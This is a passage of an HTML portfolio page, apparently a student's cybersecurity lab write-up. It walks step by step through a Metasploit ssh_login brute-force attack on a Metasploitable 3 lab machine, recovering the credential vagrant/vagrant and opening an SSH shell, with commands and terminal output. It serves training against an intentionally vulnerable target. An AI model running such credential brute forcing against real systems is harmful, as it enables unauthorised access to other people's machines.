+          Now that you can see 19 open services — including FTP (21), SSH (22), HTTP (80), and multiple web servers — which would you target first, and why? What makes SSH on port 22 a particularly attractive attack vector?
+        </div>
+        <div style="margin-top:1.5rem;">
+          <button class="part-tab active" onclick="switchPart('part2', document.querySelectorAll('.part-tab')[1])" style="background:var(--accent);color:var(--bg);border-radius:6px;padding:10px 22px;font-size:0.82rem;cursor:pointer;border:none;font-family:'IBM Plex Mono',monospace;letter-spacing:0.04em;">Continue to Part 2 — SSH Brute Force →</button>
+        </div>
+      </section>
+    </div>
+
+    <!-- ══════════════ PART 2 ══════════════ -->
+    <div class="part" id="part2">
+
+      <div class="part-banner">
+        <span class="part-banner-icon">🔑</span>
+        <div>
+          <div class="part-banner-label">Part 2 of 2 — Requires Part 1</div>
+          <div class="part-banner-title">SSH Brute Force Lab</div>
+          <div class="part-banner-desc">Using the workspace data from Part 1, exploit the open SSH port on Metasploitable 3 by running a brute force credential attack with the Metasploit auxiliary module.</div>
+        </div>
+      </div>
+
+      <section id="p2-overview">
+        <span class="step-num">// Overview</span>
+        <h2>Exploiting an Open SSH Port</h2>
+        <p>SSH (Secure Shell) on port 22 was discovered during our Nmap scan. If weak or default credentials are in use, it becomes an easy entry point. In this lab we use Metasploit's <code style="font-family:'IBM Plex Mono',monospace;color:var(--accent);font-size:0.85em">ssh_login</code> auxiliary module to automate a brute force attack using a known wordlist.</p>
+        <div class="callout">
+          <strong>// PREREQUISITE</strong>
+          This lab continues from Part 1. You need the meta3 workspace populated with Nmap data before proceeding.
+        </div>
+      </section>
+
+      <section id="p2-step1">
+        <span class="step-num">// Step 01</span>
+        <h2>Open Terminal & Become Root</h2>
+        <p>Open a fresh Kali Linux terminal session and escalate to root.</p>
+        <div class="terminal">
+          <div class="terminal-bar"><span class="tb-r"></span><span class="tb-y"></span><span class="tb-g"></span></div>
+          <div class="terminal-body">
+            <span class="t-prompt">└─$ </span><span class="t-cmd">sudo su</span><br>
+            <span class="t-prompt"># </span>
+          </div>
+        </div>
+      </section>
+
+      <section id="p2-step2">
+        <span class="step-num">// Step 02</span>
+        <h2>Start PostgreSQL & Init MSF Database</h2>
+        <p>Start the database service and re-initialize msfdb. Since you already ran this in Part 1, it will detect the existing database and skip re-initialization.</p>
+        <div class="terminal">
+          <div class="terminal-bar"><span class="tb-r"></span><span class="tb-y"></span><span class="tb-g"></span></div>
+          <div class="terminal-body">
+            <span class="t-prompt"># </span><span class="t-cmd">service postgresql start</span><br><br>
+            <span class="t-prompt"># </span><span class="t-cmd">msfdb init</span><br>
+            <span class="t-info">[i] Database already started</span><br>
+            <span class="t-info">[i] The database appears to be already configured, skipping initialization</span>
+          </div>
+        </div>
+      </section>
+
+      <section id="p2-step3">
+        <span class="step-num">// Step 03</span>
+        <h2>Launch msfconsole</h2>
+        <div class="terminal">
+          <div class="terminal-bar"><span class="tb-r"></span><span class="tb-y"></span><span class="tb-g"></span></div>
+          <div class="terminal-body">
+            <span class="t-prompt"># </span><span class="t-cmd">msfconsole -q</span><br>
+            <span class="t-info">msf6 &gt; </span>
+          </div>
+        </div>
+      </section>
+
+      <section id="p2-step4">
+        <span class="step-num">// Step 04</span>
+        <h2>Switch to the Correct Workspace</h2>
+        <p>Verify which workspace has your Nmap data. Switch to <code style="font-family:'IBM Plex Mono',monospace;color:var(--accent);font-size:0.85em">meta3</code> if you're not already on it.</p>
+        <div class="terminal">
+          <div class="terminal-bar"><span class="tb-r"></span><span class="tb-y"></span><span class="tb-g"></span></div>
+          <div class="terminal-body">
+            <span class="t-info">msf6 &gt; </span><span class="t-cmd">workspace -v</span><br><br>
+            <span class="t-out">current&nbsp;&nbsp;name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hosts&nbsp;&nbsp;services&nbsp;&nbsp;vulns&nbsp;&nbsp;creds&nbsp;&nbsp;loots&nbsp;&nbsp;notes</span><br>
+            <span class="t-out">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;default&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0</span><br>
+            <span class="t-success">*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;meta3&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;19&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2</span><br><br>
+            <span class="t-cm"># If not on meta3, switch with:</span><br>
+            <span class="t-info">msf6 &gt; </span><span class="t-cmd">workspace meta3</span>
+          </div>
+        </div>
+      </section>
+
+      <section id="p2-step5">
+        <span class="step-num">// Step 05</span>
+        <h2>View Services & Search SSH Modules</h2>
+        <p>Confirm the SSH port is visible, then search for auxiliary modules targeting SSH.</p>
+        <div class="terminal">
+          <div class="terminal-bar"><span class="tb-r"></span><span class="tb-y"></span><span class="tb-g"></span></div>
+          <div class="terminal-body">
+            <span class="t-info">msf6 &gt; </span><span class="t-cmd">services</span><br>
+            <span class="t-out">10.0.2.20 &nbsp; 22 &nbsp; tcp &nbsp; ssh &nbsp; open &nbsp; OpenSSH 7.1 protocol 2.0</span><br>
+            <span class="t-out">...</span><br><br>
+            <span class="t-info">msf6 &gt; </span><span class="t-cmd">search type:aux ssh</span><br><br>
+            <span class="t-header">Matching Modules<br>════════════════</span><br>
+            <span class="t-out">&nbsp;#&nbsp;&nbsp; Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Disclosure</span><br>
+            <span class="t-out">&nbsp;─&nbsp;&nbsp; ────</span><br>
+            <span class="t-out">&nbsp;0&nbsp;&nbsp; auxiliary/scanner/ssh/apache_karaf_command_execution&nbsp;&nbsp;2016-02-09</span><br>
+            <span class="t-out">&nbsp;1&nbsp;&nbsp; auxiliary/scanner/ssh/karaf_login</span><br>
+            <span class="t-out">&nbsp;...</span><br>
+            <span class="t-success">&nbsp;15&nbsp; auxiliary/scanner/ssh/ssh_login</span>
+          </div>
+        </div>
+      </section>
+
+      <section id="p2-step6">
+        <span class="step-num">// Step 06</span>
+        <h2>Load the ssh_login Module</h2>
+        <p>Select module 15 — <code style="font-family:'IBM Plex Mono',monospace;color:var(--accent);font-size:0.85em">auxiliary/scanner/ssh/ssh_login</code> — which is designed to brute force SSH login credentials.</p>
+        <div class="terminal">
+          <div class="terminal-bar"><span class="tb-r"></span><span class="tb-y"></span><span class="tb-g"></span></div>
+          <div class="terminal-body">
+            <span class="t-info">msf6 &gt; </span><span class="t-cmd">use 15</span><br>
+            <span class="t-success">msf6 auxiliary(scanner/ssh/ssh_login) &gt; </span>
+          </div>
+        </div>
+      </section>
+
+      <section id="p2-step7">
+        <span class="step-num">// Step 07</span>
+        <h2>Review & Configure Module Options</h2>
+        <p>Run <code style="font-family:'IBM Plex Mono',monospace;color:var(--accent);font-size:0.85em">options</code> to see all configurable parameters, then set the target IP (RHOSTS).</p>
+        <div class="terminal">
+          <div class="terminal-bar"><span class="tb-r"></span><span class="tb-y"></span><span class="tb-g"></span></div>
+          <div class="terminal-body">
+            <span class="t-success">msf6 auxiliary(scanner/ssh/ssh_login) &gt; </span><span class="t-cmd">options</span><br><br>
+            <span class="t-header">Module options (auxiliary/scanner/ssh/ssh_login):</span><br><br>
+            <span class="t-out">&nbsp;&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Current Setting&nbsp;&nbsp;Required</span><br>
+            <span class="t-out">&nbsp;&nbsp;&nbsp;────&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;───────────────&nbsp;&nbsp;────────</span><br>
+            <span class="t-out">&nbsp;&nbsp;&nbsp;BLANK_PASSWORDS&nbsp;&nbsp;&nbsp;false&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;no</span><br>
+            <span class="t-out">&nbsp;&nbsp;&nbsp;BRUTEFORCE_SPEED&nbsp;&nbsp;5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes</span><br>
+            <span class="t-out">&nbsp;&nbsp;&nbsp;PASS_FILE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;no</span><br>
+            <span class="t-out">&nbsp;&nbsp;&nbsp;RHOSTS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes</span><br>
+            <span class="t-out">&nbsp;&nbsp;&nbsp;RPORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;22&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes</span><br>
+            <span class="t-out">&nbsp;&nbsp;&nbsp;USER_FILE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;no</span><br><br>
+            <span class="t-success">msf6 auxiliary(scanner/ssh/ssh_login) &gt; </span><span class="t-cmd">set rhosts 10.0.2.20</span><br>
+            <span class="t-out">rhosts =&gt; 10.0.2.20</span>
+          </div>
+        </div>
+      </section>
+
+      <section id="p2-step8">
+        <span class="step-num">// Step 08</span>
+        <h2>Set the Username Wordlist</h2>
+        <p>Point the module to a file containing usernames to try. Metasploit ships with several wordlists — we'll use the Unix users list.</p>
+        <div class="terminal">
+          <div class="terminal-bar"><span class="tb-r"></span><span class="tb-y"></span><span class="tb-g"></span></div>
+          <div class="terminal-body">
+            <span class="t-success">msf6 auxiliary(scanner/ssh/ssh_login) &gt; </span><span class="t-cmd">set user_file /usr/share/wordlists/metasploit/unix_users.txt</span><br>
+            <span class="t-out">user_file =&gt; /usr/share/wordlists/metasploit/unix_users.txt</span>
+          </div>
+        </div>
+      </section>
+
+      <section id="p2-step9">
+        <span class="step-num">// Step 09</span>
+        <h2>Set user_as_pass & Enable Verbose</h2>
+        <p>Setting <code style="font-family:'IBM Plex Mono',monospace;color:var(--accent);font-size:0.85em">user_as_pass true</code> tells the module to try each username as its own password — a common pattern for default or misconfigured credentials. Enable verbose to monitor progress live.</p>
+        <div class="terminal">
+          <div class="terminal-bar"><span class="tb-r"></span><span class="tb-y"></span><span class="tb-g"></span></div>
+          <div class="terminal-body">
+            <span class="t-success">msf6 auxiliary(scanner/ssh/ssh_login) &gt; </span><span class="t-cmd">set user_as_pass true</span><br>
+            <span class="t-out">user_as_pass =&gt; true</span><br><br>
+            <span class="t-success">msf6 auxiliary(scanner/ssh/ssh_login) &gt; </span><span class="t-cmd">set verbose true</span><br>
+            <span class="t-out">verbose =&gt; true</span>
+          </div>
+        </div>
+        <div class="callout">
+          <strong>// WHY user_as_pass?</strong>
+          Many systems — especially defaults or poorly configured ones — use identical usernames and passwords (e.g., admin/admin, vagrant/vagrant). This technique tests that pattern across every username in the wordlist without needing a separate password file.
+        </div>
+      </section>
+
+      <section id="p2-step10">
+        <span class="step-num">// Step 10</span>
+        <h2>Run the Attack & Verify Results</h2>
+        <p>Execute the module. When complete, check the workspace to see vulns and creds updated.</p>
+        <div class="terminal">
+          <div class="terminal-bar"><span class="tb-r"></span><span class="tb-y"></span><span class="tb-g"></span></div>
+          <div class="terminal-body">
+            <span class="t-success">msf6 auxiliary(scanner/ssh/ssh_login) &gt; </span><span class="t-cmd">run</span><br>
+            <span class="t-out">...</span><br><br>
+            <span class="t-success">msf6 auxiliary(scanner/ssh/ssh_login) &gt; </span><span class="t-cmd">workspace -v</span><br><br>
+            <span class="t-out">current&nbsp;&nbsp;name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hosts&nbsp;&nbsp;services&nbsp;&nbsp;vulns&nbsp;&nbsp;creds&nbsp;&nbsp;loots&nbsp;&nbsp;notes</span><br>
+            <span class="t-out">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;default&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0</span><br>
+            <span class="t-success">*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;meta3&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;19&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ffa657">1</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ffa657">1</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2</span>
+          </div>
+        </div>
+        <div class="callout green">
+          <strong>// SUCCESS</strong>
+          The vulns and creds columns both updated to 1 — a credential was successfully brute forced!
+        </div>
+      </section>
+
+      <section id="p2-step11">
+        <span class="step-num">// Step 11</span>
+        <h2>View Credentials & SSH Into the Target</h2>
+        <p>Run <code style="font-family:'IBM Plex Mono',monospace;color:var(--accent);font-size:0.85em">creds</code> to see the discovered credential, then use it to SSH directly into the Metasploitable 3 machine.</p>
+        <div class="terminal">
+          <div class="terminal-bar"><span class="tb-r"></span><span class="tb-y"></span><span class="tb-g"></span></div>
+          <div class="terminal-body">
+            <span class="t-success">msf6 auxiliary(scanner/ssh/ssh_login) &gt; </span><span class="t-cmd">creds</span><br><br>
+            <span class="t-header">Credentials<br>═══════════</span><br><br>
+            <span class="t-out">host&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;origin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;service&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;&nbsp;&nbsp;&nbsp;private&nbsp;&nbsp;&nbsp;private_type</span><br>
+            <span class="t-out">────&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;──────&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;───────&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;──────&nbsp;&nbsp;&nbsp;&nbsp;───────&nbsp;&nbsp;&nbsp;────────────</span><br>
+            <span class="t-success">10.0.2.20&nbsp;&nbsp;10.0.2.20&nbsp;&nbsp;22/tcp (ssh)&nbsp;&nbsp;&nbsp;&nbsp;vagrant&nbsp;&nbsp;&nbsp;vagrant&nbsp;&nbsp;&nbsp;Password</span>
+          </div>
+        </div>
+
+        <div class="terminal" style="margin-top:1rem;">
+          <div class="terminal-bar"><span class="tb-r"></span><span class="tb-y"></span><span class="tb-g"></span></div>
+          <div class="terminal-body">
+            <span class="t-prompt"># </span><span class="t-cmd">ssh vagrant@10.0.2.20</span><br>
+            <span class="t-out">vagrant@10.0.2.20's password: </span><span class="t-cm">(type: vagrant)</span><br>
+            <span class="t-out">Last login: Mon Sep 12 11:23:36 2022 from 10.0.2.15</span><br>
+            <span class="t-success">-sh-4.3$ </span>
+          </div>
+        </div>
+
+        <div class="callout green" style="margin-top:1rem;">
+          <strong>// REMOTE ACCESS ACHIEVED</strong>
+          You now have an interactive shell on the Metasploitable 3 machine via SSH using the brute-forced credentials vagrant/vagrant.
+        </div>
+      </section>
+
+      <section id="p2-summary">
+        <span class="step-num">// Summary</span>
+        <h2>Lab 2 Summary</h2>
+        <p>This two-part lab demonstrated a complete reconnaissance-to-exploitation workflow using Metasploit — from initial network scanning and workspace management, through to credential brute forcing and gaining remote shell access.</p>
+
+        <div class="summary-card" style="margin-top:1rem;">
+          <h3>// Commands Used in Part 2</h3>
+          <ul class="cmd-list">
+            <li><span class="cmd-name">workspace -v</span><span class="cmd-desc">Verify workspace and switch if needed</span></li>
+            <li><span class="cmd-name">services</span><span class="cmd-desc">View all open ports from the workspace</span></li>
+            <li><span class="cmd-name">search type:aux ssh</span><span class="cmd-desc">Find SSH-related auxiliary modules</span></li>
+            <li><span class="cmd-name">use 15</span><span class="cmd-desc">Load the ssh_login auxiliary module</span></li>
+            <li><span class="cmd-name">options</span><span class="cmd-desc">View and configure module parameters</span></li>
+            <li><span class="cmd-name">set rhosts &lt;IP&gt;</span><span class="cmd-desc">Set the target machine IP address</span></li>
+            <li><span class="cmd-name">set user_file &lt;path&gt;</span><span class="cmd-desc">Point to a username wordlist file</span></li>
+            <li><span class="cmd-name">set user_as_pass true</span><span class="cmd-desc">Try each username as its own password</span></li>
+            <li><span class="cmd-name">set verbose true</span><span class="cmd-desc">Show live output during execution</span></li>
+            <li><span class="cmd-name">run</span><span class="cmd-desc">Execute the brute force attack</span></li>
+            <li><span class="cmd-name">creds</span><span class="cmd-desc">View discovered credentials</span></li>
+            <li><span class="cmd-name">ssh user@&lt;IP&gt;</span><span class="cmd-desc">Connect to the target via SSH</span></li>
+          </ul>
+        </div>
+
+        <div class="callout orange" style="margin-top:1rem;">
+          <strong>// CHALLENGE</strong>
+          Now that you're SSH'd into Metasploitable 3, try creating a file on the target machine using the SSH connection. Can you also try to view the commands available to you using <code style="font-family:'IBM Plex Mono',monospace">help</code>?
+        </div>
+      </section>
+
+    </div>
+    <!-- END PART 2 -->
+
+  </main>
+</div>
+
+<footer>
+  <p>© 2026 · <a href="index.html">Rizuanul Haque</a> · NPower NII Labworks · Cybersecurity Portfolio</p>
+</footer>
+
+<button class="scroll-top" id="scrollTop">↑</button>
+
+<script>
+  function switchPart(partId, tabEl) {
+    document.querySelectorAll('.part').forEach(p => p.classList.remove('active'));
+    document.querySelectorAll('.part-tab').forEach(t => t.classList.remove('active'));
+    document.getElementById(partId).classList.add('active');
+    tabEl.classList.add('active');
+
+    // Update TOC
+    const toc = document.getElementById('tocList');
+    if (partId === 'part1') {
+      toc.innerHTML = `
+        <li><a href="#overview1">Overview</a></li>
+        <li><a href="#step1">Step 1 — Root Access</a></li>
+        <li><a href="#step2">Step 2 — Start PostgreSQL</a></li>
+        <li><a href="#step3">Step 3 — Init MSF DB</a></li>
+        <li><a href="#step4">Step 4 — Launch msfconsole</a></li>
+        <li><a href="#step5">Step 5 — View Workspaces</a></li>
+        <li><a href="#step6">Step 6 — Create Workspace</a></li>
+        <li><a href="#step7">Step 7 — Find Target IP</a></li>
+        <li><a href="#step8">Step 8 — Run db_nmap</a></li>
+        <li><a href="#step9">Step 9 — Verify Services</a></li>
+        <li><a href="#step10">Step 10 — List Services</a></li>
+        <li><a href="#summary1">Summary</a></li>`;
+    } else {
+      toc.innerHTML = `
+        <li><a href="#p2-overview">Overview</a></li>
+        <li><a href="#p2-step1">Step 1 — Root Access</a></li>
+        <li><a href="#p2-step2">Step 2 — Start Services</a></li>
+        <li><a href="#p2-step3">Step 3 — msfconsole</a></li>
+        <li><a href="#p2-step4">Step 4 — Switch Workspace</a></li>
+        <li><a href="#p2-step5">Step 5 — Search SSH Modules</a></li>
+        <li><a href="#p2-step6">Step 6 — Load ssh_login</a></li>
+        <li><a href="#p2-step7">Step 7 — Configure Options</a></li>
+        <li><a href="#p2-step8">Step 8 — Set Wordlist</a></li>
+        <li><a href="#p2-step9">Step 9 — user_as_pass</a></li>
+        <li><a href="#p2-step10">Step 10 — Run Attack</a></li>
+        <li><a href="#p2-step11">Step 11 — SSH In</a></li>
+        <li><a href="#p2-summary">Summary</a></li>`;
+    }
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  }
+
+  const st = document.getElementById('scrollTop');
+  window.addEventListener('scroll', () => st.classList.toggle('visible', window.scrollY > 300));
+  st.addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));
+</script>
+</body>
+</html>
